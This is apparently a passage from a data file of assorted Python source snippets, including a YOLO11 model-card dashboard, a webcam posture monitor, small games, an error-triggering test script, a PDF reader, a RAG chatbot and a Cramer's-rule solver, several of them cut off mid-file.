embed_dim**0.5)\n        self.attn = nn.MultiheadAttention(embed_dim, num_heads, batch_first=True)\n        self.ln_q = norm_layer(embed_dim)\n        self.ln_kv = norm_layer(embed_dim)\n        self.out_proj = nn.Linear(embed_dim, embed_dim)\n\n\n    def forward(self, x, key_padding_mask):\n        x = self.ln_kv(x)\n        q = self.ln_q(self.query).unsqueeze(0).repeat(x.size(0), 1, 1)\n        # key_padding_mask: True indicates the position to be masked\n        out, _ = self.attn(q, x, x, k",
    "import streamlit as st\n\nimport pandas as pd\n\nimport settings as settings\nfrom pages.utils.layout_model import plot_epoch_vs_loss\n\ndef main():\n    st.set_page_config(page_title=\"Model Card\", page_icon=\"\ud83d\udcc3\", layout='wide', )\n    # st.title(\"Model Cards\")\n    # st.markdown(\"Summary of model specifications and training result.\")\n\n    # Add empty space using markdown (custom height)\n    st.sidebar.markdown(\"<br><br><br><br><br><br><br><br><br><br><br><br>\", unsafe_allow_html=True)\n    st.sidebar.markdown(\"<br><br>\", unsafe_allow_html=True)\n    # Add name and LinkedIn link at the bottom\n    st.sidebar.markdown(\"\"\"\n    Reference: \n    \n    Jocher, G., & Qiu, J. (2024). Ultralytics YOLO11 (11.0.0) [Computer software]. https://github.com/ultralytics/ultralytics  \n                        \n                        \"\"\")\n\n    general_params_df = pd.read_csv(settings.general_param_path)\n    training_pdf = pd.read_csv(settings.training_path)\n    training_pdf_1 = pd.read_csv(settings.training_path_1)\n\n    st.subheader(\":red[Training and General Parameters]\")\n    genparam_container = st.container(border=True)\n    training_code = '''\n                    from ultralytics import YOLO\n\n                    model = YOLO(model_name)                    # Initialize model, automatically downloads latest pretrained weights\n                    results = model.train(training_parameters)  # Train model, requires yaml file for dataset directory and class labels \n                    '''\n\n    with genparam_container:\n        st.code(training_code, language='python', wrap_lines=True)\n        st.table(general_params_df)\n        st.markdown(\n        '''\\* *Specific augmentation strategy variable keywords can be found in the\n        [ultralytics mode/train](https://docs.ultralytics.com/modes/train/#train-settings).*          \n        \\* **Image size equal to 1280 was also tested in Revision 1.*       \n\n        ''')\n                    \n\n    st.subheader(\":red[Metrics and Validation Results]\")\n    training_container = st.container(border=True)\n    with training_container:\n        training_results_R0 = st.expander('Revision 0 Results', expanded=False)\n        with training_results_R0:\n            st.dataframe(training_pdf)\n\n        # training_results_R1 = st.expander('Revision 1 Results', expanded=False)\n        # with training_results_R1:\n        st.markdown('Revision 1 Results')   \n        st.dataframe(training_pdf_1)\n\n        \n        st.markdown('''\n                    Note: \n                    - ALL Models are evaluated on the validation set using :red-background[minimum confidence and Iou threshold of 0.60].\n                    - \u2191 means higher values are better, \u2193 means lower values are better.\n                    - *(b)* corresponds to box (detection) metrics while *(m)* corresponds to mask (segmentation) metrics.\n                    - *F* denotes freezed backbone, *NF* denotes non-freezed backbone.\n                    - For reference, \n                    [pytorch MaskRCNN ResNet50 FPN V2 pre-trained model](https://pytorch.org/vision/main/models/generated/torchvision.models.detection.maskrcnn_resnet50_fpn_v2.html#torchvision.models.detection.MaskRCNN_ResNet50_FPN_V2_Weights) \n                    has 46.4M parameters. \n                    ''')\n    \n    revision0_expander = st.expander('Revision 0 Training', expanded=False)\n\n    with revision0_expander:\n        tab1n, tab2m, tab3x, tab1n_s, tab2m_s, tab3x_s = st.tabs([\"YOLO11N\", \"YOLO11M\", \"YOLO11X\", \n                                                                    \"YOLO11N-SEG\", \"YOLO11M-SEG\", \"YOLO11X-SEG\", \n                                                                    ])\n        \n        yolo11n_loss_df = pd.read_csv(settings.yolo11n_loss_path)\n        yolo11ns_loss_df = pd.read_csv(settings.yolo11ns_loss_path)\n\n        yolo11m_loss_df = pd.read_csv(settings.yolo11m_loss_path)\n        yolo11ms_loss_df = pd.read_csv(settings.yolo11ms_loss_path)\n        \n        yolo11x_loss_df = pd.read_csv(settings.yolo11x_loss_path)\n        yolo11xs_loss_df = pd.read_csv(settings.yolo11xs_loss_path)\n        \n        with tab1n:\n                tabcol1, tabcol2 = st.columns([1, 1])\n                with tabcol1:\n                    container = st.container(border=True, )\n                    with container: \n                        plot_epoch_vs_loss(\"YOLO11N\", yolo11n_loss_df, 'train/box_loss', 'val/box_loss', 'Box')\n                        st.markdown('---')\n                        plot_epoch_vs_loss(\"YOLO11N\", yolo11n_loss_df, 'train/cls_loss', 'val/cls_loss', 'Class')\n                        st.markdown('---')\n                        plot_epoch_vs_loss(\"YOLO11N\", yolo11n_loss_df, 'train/dfl_loss', 'val/dfl_loss', 'DFL')\n                with tabcol2:\n                    st.image(settings.yolo11n_conf_path, use_container_width =True)\n                    st.image(settings.yolo11n_val_path, use_container_width =True)\n                        \n        with tab2m:\n                tabcol1, tabcol2 = ",
    "import cv2\nfrom mediapipe.python.solutions import pose as mp_pose\nimport threading\nfrom winsound import Beep\nfrom json import load, dump\nimport tkinter as tk\nimport ctypes\nfrom time import time as current_time\n\n# TO DO :monitor cpu usage, reduce frame processing rate if necessary...\n# from psutil import cpu_percent\n\n\n\nclass PostureMonitor:\n    def __init__(self):\n        self.default_threshold = 0.35\n        self.default_slouching_duration = 5\n        self.slouching_start = None\n        self.threshold, self.slouching_duration = self.load_settings()\n\n        # Initialize Mediapipe Pose\n        self.pose = mp_pose.Pose(min_detection_confidence=0.6, min_tracking_confidence=0.6)\n        \n        # Variables for sound control\n        self.stop_event = threading.Event()\n        self.stop_event.set()  # Start with sound stopped\n        self.sound_thread = None\n        \n        # Load Haar Cascade classifiers\n        self.frontal_face_classifier = cv2.CascadeClassifier(\"frontal_face_detection_openCV_Github_file.xml\")\n        self.profile_face_classifier = cv2.CascadeClassifier(\"profile_side_face_detection_openCV_Github_file.xml\")\n\n    # Load the threshold from the settings file\n    def load_settings(self):\n        try:\n            with open(\"posture_settings.json\", \"r\") as f:\n                settings = load(f)\n                return settings.get('threshold'), settings.get('slouching_duration')\n        except FileNotFoundError:\n                return self.default_threshold, self.default_slouching_duration\n    \n    def save_settings(self, threshold, slouching_duration):\n        with open('posture_settings.json', \"w\") as f:\n            dump({\"threshold\": self.threshold, \"slouching_duration\": self.slouching_duration}, f)\n\n    def play_sound_loop(self):\n        while not self.stop_event.is_set():\n            Beep(1000, 1000)  # Single continuous 1000Hz beep, 1 second duration\n\n    def get_ear_positions(self, results, frame, frontal_faces, profile_faces):\n            # Initialize ear positions\n            left_ear, right_ear = None, None\n\n            # Use Mediapipe ear landmarks if available\n            if results.pose_landmarks:\n                left_ear = results.pose_landmarks.landmark[mp_pose.PoseLandmark.LEFT_EAR].z\n                right_ear = results.pose_landmarks.landmark[mp_pose.PoseLandmark.RIGHT_EAR].z\n\n            # Fallback to Haar Cascade face detection if Mediapipe fails to detect ears\n            if left_ear is None or right_ear is None:\n                if len(frontal_faces) > 0:\n                    # Use the first detected frontal face\n                    left_ear, right_ear = self.estimate_ear_positions(frontal_faces[0], frame.shape[1], frame.shape[0])\n                elif len(profile_faces) > 0:\n                    # Use the first detected profile face\n                    left_ear, right_ear = self.estimate_ear_positions(profile_faces[0], frame.shape[1], frame.shape[0])\n            return left_ear, right_ear\n\n    # Function to estimate ear positions from face detection\n    def estimate_ear_positions(self, face_rect, frame_width, frame_height):\n        x, y, w, h = face_rect\n        # Estimate ear positions relative to the face rectangle\n        left_ear = (x + int(w * 0.2), y + int(h * 0.5))  # 20% from the left edge, 50% from the top\n        right_ear = (x + int(w * 0.8), y + int(h * 0.5))  # 80% from the left edge, 50% from the top\n        return left_ear, right_ear\n\n\n    def start_monitoring(self):\n        # Capture webcam feed\n        cap = cv2.VideoCapture(0)\n\n        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 320)  # Reduce frame width for faster processing\n        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)  # Reduce frame height for faster processing\n        cap.set(cv2.CAP_PROP_FPS, 15)  # Lower frame rate to 15 FPS\n\n        frame_skip = 3  # Skip frames to reduce CPU usage\n        frame_counter = 0\n\n        while cap.isOpened():\n            ret, frame = cap.read()\n            if not ret:\n                print(\"Error: Failed to read frame from webcam. Exiting...\")\n                break\n\n            # Skip processing for some frames to reduce cpu usage\n            frame_counter += 1\n            if frame_counter % frame_skip != 0:\n                continue\n\n            # Convert the frame to RGB for Mediapipe and grayscale for Haar Cascade\n            rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n            gray_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n\n            # Process the frame with Mediapipe Pose\n            results = self.pose.process(rgb_frame)\n\n            # Detect faces using Haar Cascade classifiers\n            frontal_faces = self.frontal_face_classifier.detectMultiScale(gray_frame, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))\n            profile_faces = self.profile_face_classifier.detectMultiScale(gray_frame, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))\n\n            left_ear, right_ear = self.get_ear_positions(results, frame, frontal_faces, profile_faces)\n\n            ",
    "#########################Setup.py#################################\n\nDEFAULT_SYSTEM_PROMPT_AICONFIG_AUTOMATIC = \"\"\"\nYour task is to devise up to 5 highly effective goals and an appropriate role-based name (_GPT) for an autonomous agent, ensuring that the goals are optimally aligned with the successful completion of its assigned task.\n\nThe user will provide the task, you will provide only the output in the exact format specified below with no explanation or conversation.\n\nExample input:\nHelp me with marketing my business\n\nExample output:\nName: CMOGPT\nDescription: a professional digital marketer AI that assists Solopreneurs in growing their businesses by providing world-class expertise in solving marketing problems for SaaS, content products, agencies, and more.\nGoals:\n- Engage in effective problem-solving, prioritization, planning, and supporting execution to address your marketing needs as your virtual Chief Marketing Officer.\n\n- Provide specific, actionable, and concise advice to help you make informed decisions without the use of platitudes or overly wordy explanations.\n\n- Identify and prioritize quick wins and cost-effective campaigns that maximize results with minimal time and budget investment.\n\n- Proactively take the lead in guiding you and offering suggestions when faced with unclear information or uncertainty to ensure your marketing strategy remains on track.\n\"\"\"\n\nDEFAULT_TASK_PROMPT_AICONFIG_AUTOMATIC = (\n    \"Task: '{{user_prompt}}'\\n\"\n    \"Respond only with the output in the exact format specified in the system prompt, with no explanation or conversation.\\n\"\n)\n\nDEFAULT_USER_DESIRE_PROMPT = \"Write a wikipedia style article about the project: https://github.com/significant-gravitas/Auto-GPT\"  # Default prompt\n",
    "import random\n\nprint(\"rock...\".lower())\nprint(\"paper...\".lower())\nprint(\"scissor...\".lower())\nprint(\"-----------------------------------\")\nrandomnumber = random.randint(0,2)\ncomputerMove = \"rock\"\n\nif randomnumber == 0:\n    computerMove = \"rock\"\nelif randomnumber == 1:\n        computerMove = \"paper\"\nelif randomnumber == 2:\n    computerMove = \"scissor\"\n\nplayer1_win = 0\nplayer2_win = 0\nwining_score = 4\nwhile player1_win < wining_score and player2_win < wining_score:\n    print(f\"Player1 : {player1_win}\\nvs\\nplayer2 : {player2_win}\")\n    Player_1 = input(\"Player 1 , make your move: \").lower()\n    print(f\"Player 2 , make your move :{computerMove} \")\n    Player_2 = computerMove\n\n    if Player_1 == \"q\" or Player_2 == \"q\":\n        break\n\n    if Player_1 == Player_2:\n        print(\"Draw\")\n    elif Player_1 == \"rock\":\n        if Player_2 == \"scissor\":\n            print(\"Player 1 wins!\")\n            player1_win += 1\n        elif Player_2 == \"paper\":\n            print(\"Player 2 wins!\")\n            player2_win += 1\n    elif Player_1 == \"paper\":\n        if Player_2 == \"rock\":\n            print(\"Player 1 wins!\")\n            player1_win += 1\n        elif Player_2 == \"scissor\":\n            print(\"Player 2 wins!\")\n            player2_win += 1\n    elif Player_1 == \"scissor\":\n        if Player_2 == \"paper\":\n            print(\"Player 1 wins!\")\n            player1_win += 1\n        elif Player_2 == \"rock\":\n            print(\"Player 2 wins!\")\n            player2_win += 1\n    else:\n        print(\"something went wrong!...\")\n\n\nprint(f\"Final scores\\nPlayer1 : {player1_win}\\nplayer2 : {player2_win}\")\n\n#if Player_1 == \"rock\" and Player_2 == \"scissor\":\n #   print(\"Player 1 wins!\")\n#elif Player_1 == \"rock\" and Player_2 == \"paper\":\n#    print(\"Player 2 wins!\")\n#elif Player_1 == \"paper\" and Player_2 == \"rock\":\n#    print(\"Player 1 wins!\")\n#elif Player_1 == \"paper\" and Player_2 == \"scissor\":\n#    print(\"Player 2 wins!\")\n#elif Player_2 == \"scissor\" and Player_1 == \"paper\":\n #   print(\"Player 2 wins!\")\n#elif Player_2 == \"scissor\" and Player_1 == \"rock\":\n#    print(\"Player 1 wins!\")\n#elif Player_1 == Player_2 :\n#    print(\"that's a tie ... !\")\n#else:\n#    print(\"something went wrong ... !\")\n",
    "#!/usr/bin/env python3\nimport sys\nimport argparse\nimport time\n\ndef trigger_zero_division():\n    \"\"\"Triggers a ZeroDivisionError\"\"\"\n    print(\"Attempting division by zero...\")\n    return 1 / 0\n\ndef trigger_index_error():\n    \"\"\"Triggers an IndexError\"\"\"\n    print(\"Attempting to access invalid list index...\")\n    empty_list = []\n    return empty_list[10]\n\ndef trigger_import_error():\n    \"\"\"Triggers an ImportError\"\"\"\n    print(\"Attempting to import non-existent module...\")\n    import non_existent_module\n\ndef trigger_file_error():\n    \"\"\"Triggers a FileNotFoundError\"\"\"\n    print(\"Attempting to open non-existent file...\")\n    with open('non_existent_file.txt', 'r') as f:\n        return f.read()\n\ndef trigger_syntax_error():\n    \"\"\"Triggers a SyntaxError\"\"\"\n    print(\"Executing invalid Python syntax...\")\n    eval('this is not valid python')\n\ndef trigger_memory_error():\n    \"\"\"Triggers a MemoryError\"\"\"\n    print(\"Attempting to exhaust memory...\")\n    return [1] * 10**10\n\ndef trigger_timeout():\n    \"\"\"Simulates a long-running process\"\"\"\n    print(\"Starting long process...\")\n    time.sleep(300)  # Sleep for 5 minutes\n    return \"This should timeout\"\n\ndef trigger_custom_error():\n    \"\"\"Raises a custom error with a specific message\"\"\"\n    print(\"Raising custom error...\")\n    raise Exception(\"This is a custom error message for testing!\")\n\ndef successful_execution():\n    \"\"\"Simulates a successful script execution\"\"\"\n    print(\"Starting successful execution...\")\n    print(\"Performing some work...\")\n    time.sleep(1)  # Simulate some work being done\n    print(\"Work completed successfully!\")\n    return \"Success\"\n\ndef main():\n    parser = argparse.ArgumentParser(description='Script to trigger various errors for testing')\n    parser.add_argument('error_type', \n                      choices=['success', 'division', 'index', 'import', 'file', 'syntax', \n                              'memory', 'timeout', 'custom'],\n                      help='Type of error to trigger (or \"success\" for no error)')\n    parser.add_argument('--exit-code', type=int, default=1,\n                      help='Exit code to return on error (default: 1)')\n    \n    args = parser.parse_args()\n\n    # Dictionary mapping error types to functions\n    error_functions = {\n        'success': successful_execution,\n        'division': trigger_zero_division,\n        'index': trigger_index_error,\n        'import': trigger_import_error,\n        'file': trigger_file_error,\n        'syntax': trigger_syntax_error,\n        'memory': trigger_memory_error,\n        'timeout': trigger_timeout,\n        'custom': trigger_custom_error\n    }\n\n    try:\n        # Print some output to stdout before execution\n        print(f\"Starting test: {args.error_type}\")\n        print(\"This is some normal output to stdout\")\n        \n        if args.error_type != 'success':\n            print(\"Error will occur after this line\", file=sys.stderr)\n        \n        # Execute the selected function\n        result = error_functions[args.error_type]()\n        \n        if args.error_type == 'success':\n            print(f\"Execution completed with result: {result}\")\n            sys.exit(0)\n\n    except Exception as e:\n        print(f\"Error occurred: {str(e)}\", file=sys.stderr)\n        sys.exit(args.exit_code)\n\nif __name__ == \"__main__\":\n    main()\n",
    "import PyPDF2\nimport pyttsx3\nimport os\nimport langdetect\nimport traceback\n\n\ndef list_available_voices(speaker):\n    voices = speaker.getProperty('voices')\n    for idx, voice in enumerate(voices):\n        try:\n            languages = [lang.decode() for lang in voice.languages]\n        except AttributeError:\n            languages = voice.languages\n        print(f\"Voice {idx}:\")\n        print(f\"  ID: {voice.id}\")\n        print(f\"  Name: {voice.name}\")\n        print(f\"  Languages: {languages}\")\n        print()\n\n\ndef get_voice_for_language(speaker, lang_code):\n    voices = speaker.getProperty('voices')\n    for voice in voices:\n        if hasattr(voice, 'languages') and voice.languages:\n            try:\n                lang = voice.languages[0].decode().lower()\n            except AttributeError:\n                lang = voice.languages[0].lower()\n            if lang_code.lower() in lang:\n                return voice.id\n        else:\n            if lang_code.lower() in voice.id.lower() or lang_code.lower() in voice.name.lower():\n                return voice.id\n    return None\n\n\ndef read_pdf_aloud(file_path, start_page=1):\n    if not os.path.isfile(file_path):\n        print(f\"File '{file_path}' not found.\")\n        return\n\n    try:\n        with open(file_path, \"rb\") as book:\n            pdf_reader = PyPDF2.PdfReader(book)\n            total_pages = len(pdf_reader.pages)\n\n            if start_page < 1 or start_page > total_pages:\n                print(f\"Invalid page number. File contains {total_pages} pages.\")\n                return\n\n            speaker = pyttsx3.init()\n            list_available_voices(speaker)\n\n            print(f\"Let's start reading from page {start_page} from {total_pages}...\")\n\n            for num in range(start_page - 1, total_pages):\n                page = pdf_reader.pages[num]\n                text = page.extract_text()\n\n                if text:\n                    try:\n                        lang = langdetect.detect(text)\n                        print(f\"Page {num + 1}: language defined '{lang}'\")\n                        voice_id = get_voice_for_language(speaker, lang)\n                        if voice_id:\n                            speaker.setProperty('voice', voice_id)\n                        else:\n                            print(f\"'{lang}' not found. Using default voice.\")\n                        speaker.say(text)\n                    except langdetect.lang_detect_exception.LangDetectException:\n                        print(\n                            f\"Unable to determine the language of the text on the page {num + 1}. The default voice is used.\")\n                        speaker.say(text)\n                else:\n                    print(f\"Failed to extract text from page {num + 1}.\")\n\n            speaker.runAndWait()\n            print(\"Reading completed.\")\n\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n        traceback.print_exc()\n\n\ndef main():\n    file_name = input(\"Enter the book title (with extension, for example, book.pdf): \")\n    try:\n        start_page = int(input(\"Enter the page number to start reading from: \"))\n    except ValueError:\n        print(\"Please enter a valid page number.\")\n        return\n\n    read_pdf_aloud(file_name, start_page)\n\n\nif __name__ == '__main__':\n    main()\n",
    "import math\r\nimport pygame\r\nimport sys\r\n\r\npygame.init()\r\n\r\n# Set up the display\r\nWIDTH, HEIGHT = 720, 720\r\nscreen = pygame.display.set_mode((WIDTH, HEIGHT))\r\npygame.display.set_caption(\"Pixelated Reveal Map with Movable Cursor\")\r\n\r\n# Load and scale the map image\r\nmap_image = pygame.image.load(\"./map.png\")\r\nmap_image = pygame.transform.scale(map_image, (WIDTH, HEIGHT))\r\n\r\n# Create a fog surface to cover the entire map\r\nfog = pygame.Surface((WIDTH, HEIGHT), pygame.SRCALPHA)\r\nfog.fill((210,180,140,255))  # Tan color\r\n\r\n# Reveal settings\r\nREVEAL_RADIUS = 40\r\nBLOCK_SIZE = 5  # Larger block size for more pixelated reveal\r\n\r\n# Updated cursor pattern\r\ncursor_pattern = [\r\n\"xxBxx\",\r\n\"xBGBx\",\r\n\"BGWGB\",\r\n\"BWWWB\",\r\n\"BWWWB\",\r\n\"BGWGB\",\r\n\"xBBBx\"\r\n]\r\n\r\ncolors = {\r\n    'B': (0,0,0),\r\n    'G': (200,200,200),\r\n    'W': (255,255,255),\r\n    'x': None  # no pixel drawn\r\n}\r\n\r\n# Draw the cursor pattern onto a surface\r\ncursor_width = len(cursor_pattern[0])\r\ncursor_height = len(cursor_pattern)\r\n\r\ncursor_surface = pygame.Surface((cursor_width*BLOCK_SIZE, cursor_height*BLOCK_SIZE), pygame.SRCALPHA)\r\ncursor_surface.fill((0,0,0,0))  # transparent background\r\n\r\nfor row_i, row in enumerate(cursor_pattern):\r\n    for col_i, char in enumerate(row):\r\n        color = colors[char]\r\n        if color is not None:\r\n            rect = pygame.Rect(\r\n                col_i*BLOCK_SIZE,\r\n                row_i*BLOCK_SIZE,\r\n                BLOCK_SIZE,\r\n                BLOCK_SIZE\r\n            )\r\n            pygame.draw.rect(cursor_surface, color, rect)\r\n\r\n# Cursor initial position and angle\r\ncursor_pos = [WIDTH//2, HEIGHT//2]\r\n\r\n# Angle definition:\r\n# 0 degrees = Up\r\n# Angle increases counterclockwise:\r\n#  90 deg = Left, 180 deg = Down, 270 deg = Right\r\ncursor_angle = 0.0\r\n\r\n# Movement parameters\r\nmove_speed = 2      \r\nrotate_speed = 5    \r\n\r\n# Key states for continuous movement\r\nkeys_held = {\r\n    pygame.K_UP: False,\r\n    pygame.K_DOWN: False,\r\n    pygame.K_LEFT: False,\r\n    pygame.K_RIGHT: False\r\n}\r\n\r\ndef reveal_around_point(cx, cy):\r\n    # Reveal a pixelated area around the given point (cx, cy)\r\n    start_x = max(int(cx - REVEAL_RADIUS), 0)\r\n    end_x = min(int(cx + REVEAL_RADIUS), WIDTH - 1)\r\n    start_y = max(int(cy - REVEAL_RADIUS), 0)\r\n    end_y = min(int(cy + REVEAL_RADIUS), HEIGHT - 1)\r\n\r\n    fog.lock()\r\n    for y in range(start_y, end_y, BLOCK_SIZE):\r\n        for x in range(start_x, end_x, BLOCK_SIZE):\r\n            # center of this block\r\n            block_cx = x + BLOCK_SIZE // 2\r\n            block_cy = y + BLOCK_SIZE // 2\r\n            dist_sq = (block_cx - cx)**2 + (block_cy - cy)**2\r\n            if dist_sq <= REVEAL_RADIUS**2:\r\n                # Erase BLOCK_SIZE area\r\n                for yy in range(y, min(y+BLOCK_SIZE, HEIGHT)):\r\n                    for xx in range(x, min(x+BLOCK_SIZE, WIDTH)):\r\n                        fog.set_at((xx, yy), (0,0,0,0))\r\n    fog.unlock()\r\n\r\nrunning = True\r\nclock = pygame.time.Clock()\r\n\r\n# Initially reveal at the starting position\r\nreveal_around_point(cursor_pos[0], cursor_pos[1])\r\n\r\nwhile running:\r\n    dt = clock.tick(60)  # Frame rate\r\n    for event in pygame.event.get():\r\n        if event.type == pygame.QUIT:\r\n            running = False\r\n            break\r\n\r\n        if event.type == pygame.KEYDOWN:\r\n            if event.key in keys_held:\r\n                keys_held[event.key] = True\r\n        if event.type == pygame.KEYUP:\r\n            if event.key in keys_held:\r\n                keys_held[event.key] = False\r\n\r\n        if event.type == pygame.MOUSEBUTTONDOWN:\r\n            # Mouse click reveal (optional extra reveal)\r\n            mouse_x, mouse_y = event.pos\r\n            reveal_around_point(mouse_x, mouse_y)\r\n\r\n    # Handle rotation: \r\n    # LEFT key rotates counterclockwise (increasing angle),\r\n    # RIGHT key rotates clockwise (decreasing angle).\r\n    if keys_held[pygame.K_LEFT]:\r\n        cursor_angle += rotate_speed\r\n    if keys_held[pygame.K_RIGHT]:\r\n        cursor_angle -= rotate_speed\r\n\r\n    # Convert angle to radians for movement calculations\r\n    angle_radians = math.radians(cursor_angle)\r\n    # Direction vector based on angle\r\n    # At angle=0 (up), we want (0, -1)\r\n    # At angle=90 (left), we want (-1, 0), etc.\r\n    forward_dx = -math.sin(angle_radians)\r\n    forward_dy = -math.cos(angle_radians)\r\n\r\n    # Movement forward/backward\r\n    if keys_held[pygame.K_UP]:\r\n        cursor_pos[0] += forward_dx * move_speed\r\n        cursor_pos[1] += forward_dy * move_speed\r\n    if keys_held[pygame.K_DOWN]:\r\n        cursor_pos[0] -= forward_dx * move_speed\r\n        cursor_pos[1] -= forward_dy * move_speed\r\n\r\n    # Clamp the cursor within the window (optional)\r\n    cursor_pos[0] = max(0, min(WIDTH, cursor_pos[0]))\r\n    cursor_pos[1] = max(0, min(HEIGHT, cursor_pos[1]))\r\n\r\n    # Always reveal around cursor as it moves\r\n    reveal_around_point(cursor_pos[0], cursor_pos[1])\r\n\r\n    # Draw the map\r\n    screen.blit(map_image, (0,0))\r\n    # Draw the fog\r\n    screen.blit(fog, (0,0))\r\n\r\n    # Rotate and draw the cursor\r\n    rot",
    "import os\nfrom dotenv import load_dotenv\nfrom langchain_nvidia_ai_endpoints import ChatNVIDIA, NVIDIAEmbeddings\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain_community.vectorstores import Chroma\nfrom langchain_community.document_loaders import PyPDFLoader\nfrom langchain import hub\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_core.runnables import RunnablePassthrough\nimport streamlit as st\nimport datetime\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain.load import loads, dumps\n\nload_dotenv()\n\ntemplate = \"\"\"You are an AI language model assistant. Your task is to generate five \ndifferent versions of the given user question to retrieve relevant documents from a vector \ndatabase. By generating multiple perspectives on the user question, your goal is to help\nthe user overcome some of the limitations of the distance-based similarity search. \nProvide these alternative questions separated by newlines. Original question: {question}\"\"\"\nprompt_perspectives = ChatPromptTemplate.from_template(template)\n\n\ndef save_uploaded_file(uploaded_file):\n    data_dir = \"data/\"\n    os.makedirs(data_dir, exist_ok=True)\n    timestamp = datetime.datetime.now().strftime(\"%Y%m%d%H%M%S\")\n    file_path = os.path.join(data_dir, f\"{timestamp}_{uploaded_file.name}\")\n    with open(file_path, \"wb\") as f:\n        f.write(uploaded_file.getbuffer())\n    return file_path\n\n\ndef format_docs(docs):\n    return \"\\n\\n\".join(doc.page_content for doc in docs)\n\n\ndef load_docs(filepath):\n    loader = PyPDFLoader(filepath)\n    docs = loader.load()\n    return docs\n\n\ndef split_and_save_docs(docs):\n    text_splitter = RecursiveCharacterTextSplitter(chunk_size=1000, chunk_overlap=100)\n    chunks = text_splitter.split_documents(docs)\n    return chunks\n\n\ndef get_vector_store(chunks):\n    embeddings = NVIDIAEmbeddings(api_key=st.secrets.get(\"NVIDIA_API_KEY\"))\n    vectorstore = Chroma.from_documents(\n        documents=chunks,\n        embedding=embeddings,\n        persist_directory=\"chroma_db\",\n    )\n    return vectorstore\n\n\ndef conversational_chain(retriever):\n    prompt = hub.pull(\"rlm/rag-prompt\")\n\n    llm = ChatNVIDIA(\n        model=\"meta/llama-3.1-70b-instruct\",\n        api_key=st.secrets.get(\"NVIDIA_API_KEY\"),\n        temperature=0.2,\n        top_p=0.7,\n        max_tokens=1024,\n    )\n    rag_chain = (\n        {\"context\": retriever | format_docs, \"question\": RunnablePassthrough()}\n        | prompt\n        | llm\n        | StrOutputParser()\n    )\n    return rag_chain\n\n\ndef clear_chat_history():\n    st.session_state.messages = [\n        {\"role\": \"assistant\", \"content\": \"Upload some PDFs and ask me a question.\"}\n    ]\n\n\ndef main():\n    st.set_page_config(page_title=\"Conversational PDF Chatbot\", page_icon=\"\ud83e\udd16\")\n    if \"vector_store\" not in st.session_state:\n        st.session_state.vector_store = None\n\n    with st.sidebar:\n        st.title(\"Menu:\")\n        uploaded_file = st.file_uploader(\"Upload a document\", type=[\"pdf\"])\n        if st.button(\"Submit & Process\"):\n            with st.spinner(\"Processing...\"):\n                if uploaded_file is not None:\n                    filepath = save_uploaded_file(uploaded_file)\n                    docs = load_docs(filepath)\n                    chunks = split_and_save_docs(docs)\n                    vector_store = get_vector_store(chunks)\n                    st.session_state.vector_store = vector_store\n                    st.success(\"File Uploaded Successfully\")\n                else:\n                    st.warning(\"Please upload a PDF file.\")\n\n    st.title(\"Chat with PDF files using OpenAI \ud83e\udd16\")\n    st.write(\"Welcome to the chat!\")\n    st.sidebar.button(\"Clear Chat History\", on_click=clear_chat_history)\n\n    if \"messages\" not in st.session_state:\n        st.session_state.messages = [\n            {\n                \"role\": \"assistant\",\n                \"content\": \"Upload any PDF and start asking me questions!\",\n            }\n        ]\n\n    for message in st.session_state.messages:\n        with st.chat_message(message[\"role\"]):\n            st.write(message[\"content\"])\n\n    if prompt := st.chat_input():\n        st.session_state.messages.append({\"role\": \"user\", \"content\": prompt})\n        with st.chat_message(\"user\"):\n            st.write(prompt)\n\n    if st.session_state.messages[-1][\"role\"] != \"assistant\":\n        if st.session_state.vector_store:\n            retriever = st.session_state.vector_store.as_retriever()\n            chain = conversational_chain(retriever)\n            with st.chat_message(\"assistant\"):\n                with st.spinner(\"Thinking...\"):\n                    response = chain.invoke(prompt)\n                    st.write(response)\n                    st.session_state.messages.append(\n                        {\"role\": \"assistant\", \"content\": response}\n                    )\n        else:\n            with st.chat_message(\"assistant\"):\n                st.write(\n                    \"Please upload a PDF file and process it before asking questio",
    "from kivy.app import App\r\nfrom kivy.uix.boxlayout import BoxLayout\r\nfrom kivy.uix.gridlayout import GridLayout\r\nfrom kivy.uix.label import Label\r\nfrom kivy.uix.textinput import TextInput\r\nfrom kivy.uix.button import Button\r\nfrom kivy.uix.popup import Popup\r\nfrom kivy.uix.scrollview import ScrollView\r\n\r\n\r\n# Function to calculate determinant\r\ndef det(matrix):\r\n    if len(matrix) == 2:\r\n        return (matrix[0][0] * matrix[1][1]) - (matrix[0][1] * matrix[1][0])\r\n    result = 0\r\n    for i in range(len(matrix)):\r\n        minor = [row[:i] + row[i + 1:] for row in matrix[1:]]\r\n        result += (-1) ** i * matrix[0][i] * det(minor)\r\n    return result\r\n\r\n\r\n# Function to replace a column in a matrix\r\ndef replace_column(matrix, constants, column_index):\r\n    new_matrix = [row[:] for row in matrix]\r\n    for i in range(len(constants)):\r\n        new_matrix[i][column_index] = constants[i]\r\n    return new_matrix\r\n\r\n\r\n# Function to solve equations using Cramer's Rule\r\ndef solve_equations(coefficients, constants):\r\n    determinant = det(coefficients)\r\n    if determinant == 0:\r\n        return \"No solution (determinant is zero)\"\r\n    solutions = []\r\n    for i in range(len(coefficients)):\r\n        modified_matrix = replace_column(coefficients, constants, i)\r\n        solutions.append(det(modified_matrix) / determinant)\r\n    return solutions\r\n\r\n\r\nclass SolverApp(BoxLayout):\r\n    def __init__(self, **kwargs):\r\n        super().__init__(orientation=\"vertical\", spacing=10, padding=10, **kwargs)\r\n        self.equation_count = 0\r\n        self.coefficients = []\r\n        self.constants = []\r\n\r\n        # Layout for entering the number of equations\r\n        self.input_layout = BoxLayout(orientation=\"horizontal\", size_hint=(1, 0.05), spacing=10)  # Reduced height\r\n        self.add_widget(self.input_layout)\r\n\r\n        self.input_label = Label(text=\"Number of equations:\", size_hint=(0.4, 1))\r\n        self.input_layout.add_widget(self.input_label)\r\n\r\n        self.input_field = TextInput(multiline=False, input_filter=\"int\", size_hint=(0.2, 1))\r\n        